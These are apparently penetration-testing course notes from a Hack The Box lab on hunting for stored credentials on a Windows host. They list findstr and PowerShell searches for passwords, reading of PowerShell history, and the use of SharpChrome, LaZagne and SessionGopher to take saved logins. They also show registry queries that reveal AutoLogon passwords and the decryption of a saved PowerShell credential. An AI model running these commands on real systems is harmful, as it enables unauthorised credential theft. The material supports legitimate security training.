# Credential Theft

## **Credential Hunting**

*   `PS C:\\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml` searching for files

    here, /S : search in the current directory and all sub directory

    /I : Ignore case sensitivity of the string being searcher

    /M : outputs only the filenames that contain the search string and not the actual lines where the string is found.

    or

    `findstr /S /I /C:"password" "C:\\Users\\*"*.txt *.ini *.cfg *.config *.xml`
*   `C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` → Powershell history

    ```powershell
    PS C:\\htb> (Get-PSReadLineOption).HistorySavePath

    C:\\Users\\htb-student\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
    ```

    Confirming powershell history save path

    ```powershell
    PS C:\\htb> gc (Get-PSReadLineOption).HistorySavePath

    ```

    Reading Powershell history file

## **Other Files**

#### **Manually Searching the File System for Credentials**

* `C:\\htb> cd c:\\Users\\htb-student\\Documents & findstr /SI /M "password" *.xml *.ini *.txt`
* `C:\\htb> findstr /si password *.xml *.ini *.txt *.config`
* `C:\\htb> findstr /spin "password"`

#### Using Powershell

* `PS C:\\htb> select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password`
* `C:\\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`
* `C:\\htb> where /R C:\\ *.config`
* `PS C:\\htb> Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`

## **Further Credential Theft**

* `C:\\htb> cmdkey /list` → list stored usernames and passwords
* `PS C:\\htb> runas /savecred /user:inlanefreight\\bob "COMMAND HERE"` → Run command as another user.

#### **Browser Credentials**

* `PS C:\\htb> .\\SharpChrome.exe logins /unprotect` → retrieve cookies and saved logins from Google Chrome
* `PS C:\\htb> .\\lazagne.exe all` → using Lazagne to retrieve credentials from a wide variety of software.
* We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

```powershell
PS C:\\htb> Import-Module .\\SessionGopher.ps1

PS C:\\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

#### **Windows AutoLogon**

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

```
C:\\htb>reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0

    <SNIP>

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

#### **Clear-Text Password Storage in the Registry**

#### Putty

* `Computer\\HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\<SESSION NAME>` → Putty saved sessions are stored in this registery location

#### **Viewing Saved Wireless Networks**

* `C:\\htb> netsh wlan show profile`

### **PowerShell Credentials**

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data\_Protection\_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

```powershell
PS C:\\htb> $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'

PS C:\\htb> $credential.GetNetworkCredential().username

bob

PS C:\\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```
